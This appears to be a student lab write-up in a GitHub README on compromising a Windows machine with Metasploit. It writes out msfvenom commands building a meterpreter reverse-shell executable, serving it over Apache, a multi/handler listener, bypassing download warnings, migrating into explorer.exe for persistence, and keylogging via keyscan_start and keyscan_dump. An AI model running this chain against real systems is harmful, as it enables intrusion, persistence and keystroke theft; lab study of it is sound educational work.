# Compromising-windows-using-Metasploit
# AIM:
To Compromise windows using Metasploit .
## DESIGN STEPS:

- `Step 1:` Install kali linux either in partition or virtual box or in live mode
- `Step 2:` Investigate on the various categories of tools as follows:
- `Step 3:` Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![1 (2)](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/91b1d6bd-b550-44b7-9078-8e33d5d1c687)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![2 (2)](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/4a9b1ffa-12a2-4a61-a1c4-e744305813d7)


copy the fun.exe into the apache /var/www/html folder

![3 (2)](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/e46f37c0-0afc-45b3-971c-07e233b9a0a7)


Start apache server sudo systemctl apache2 start

![4 (1)](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/37c6e990-16fe-4418-bf04-152676f12279)

Check the status of apache2

![5 (2)](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/08af0bc6-af5e-4cfc-9325-576b87a9ff99)


Invoke msfconsole:
msfconsole

![6](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/3c0a3a26-eb2e-4daa-9a95-53d37db6e1cf)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![7](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/d662d5dc-1ad2-4381-a973-f6938c4951a5)


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![8](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/72b53315-b953-4822-9b5b-31a96ec49842)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![9](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/7eadee0e-ff4e-4831-8f66-a35a806eeaf5)


Bypass any warning boxes, double-click the file, and allow it to run.

![10](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/30f8d40d-233c-44f0-9c50-2808fd284ef5)


On kali give the command exploit

![11](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/845ed1b8-1b02-4282-af0e-83bebab454e0)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![12](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/8b475ebc-28f2-4eca-8be9-0f7eb2ece9fb)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![13](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/e0930792-5922-4996-a4de-bea16cc0c76c)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![14](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/119063d8-d91e-40cc-8984-83405b530098)
![15](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/5e275919-6700-4d07-8887-a48ee0827b8f)


keyscan_dump Shows the keystrokes captured so far.

![16](https://github.com/Vineesh-AI-DS/Compromising-windows-using-Metasploit/assets/93427254/41dd1ee3-0574-43a5-b0f5-f61664cbef02)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
